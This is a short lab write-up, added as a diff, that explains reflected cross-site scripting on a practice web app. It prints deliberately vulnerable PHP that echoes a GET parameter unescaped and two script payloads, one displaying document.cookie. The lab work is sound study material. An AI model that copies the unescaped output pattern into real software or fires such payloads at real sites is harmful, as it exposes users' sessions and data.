@@ -1,0 +1,40 @@
+xss or cross-site-scripting is an attack that allows the attacker to insert and execute javascript
+on the victim's website.
+
+low xss reflected : - 
+
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Feedback for end user
+    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
+}
+
+?> 
+
+
+on the web page there is a form that we can submit. if we fill in the value "test<'>" it 
+will appear as follows : 
+
+http://localhost/vulnerabilities/xss_r/?name=test<'>#
+
+the form uses methods GET and if we view source , it will look like this ; 
+
+<div class="vulnerable_code_area">
+	<form name="xss" action="#" method="GET"
+		<p>
+			What's your name?
+			<input type="text" name="name">
+			<input type="submit" value="Submit">
+		</p>
+	</form>
+	<pre>Hello test<'></pre>
+</div>
+
+
+perform attacks : - 
+<script>alert('Hacked')</script>
+<script>alert(document.cookie)</script>
